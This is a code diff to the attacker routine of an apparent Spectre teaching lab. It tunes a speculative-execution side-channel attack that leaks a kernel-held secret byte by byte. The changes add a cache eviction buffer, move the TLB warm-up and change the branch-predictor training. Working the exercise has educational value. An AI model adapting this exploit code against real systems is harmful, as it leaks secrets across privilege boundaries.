@@ -13,6 +13,8 @@
 
 #define CACHE_HIT_THRESHOLD 80
 
+#define EVICTION_SIZE (32 * 1024 * 1024)
+
 /*
  * call_kernel_part3
  * Performs the COMMAND_PART3 call in the kernel
@@ -42,6 +44,9 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
 
+    char *eviction_buf = malloc(EVICTION_SIZE);
+    memset(eviction_buf, 1, EVICTION_SIZE);
+
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
@@ -52,16 +57,24 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         int scores[256] = {0};
 
+        // Touch all pages to warm up TLB
+        for (int i = 0; i < 256; i++) {
+            volatile char tmp = shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
+        }
+
         for (int attempt = 0; attempt < 1000; attempt++) {
 
-            // Touch all pages to warm up TLB
-            for (int i = 0; i < 256; i++) {
-                volatile char tmp = shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE];
-            }
+            
 
             // 1. TRAIN branch predictor
-            for (int i = 0; i < 100; i++) {
-                call_kernel_part3(kernel_fd, shared_memory, i % 4);
+            for (int i = 0; i < 20; i++) {
+                call_kernel_part3(kernel_fd, shared_memory, 0);
+            }
+
+            //Add extra evict
+            volatile int sink = 0;
+            for (int e = 0; e < EVICTION_SIZE; e += 64) {
+                sink += eviction_buf[e];
             }
 
             // 2. FLUSH probe array
@@ -70,10 +83,6 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
 
             mfence();
-            usleep(50);
-
-            // 🔥 CRITICAL: one more training right before attack
-            call_kernel_part3(kernel_fd, shared_memory, 0);
 
             // 3. SPECULATIVE call
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
@@ -105,6 +114,8 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         }
         
     }
+
+    free(eviction_buf);
 
     leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1] = '\0';
     printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
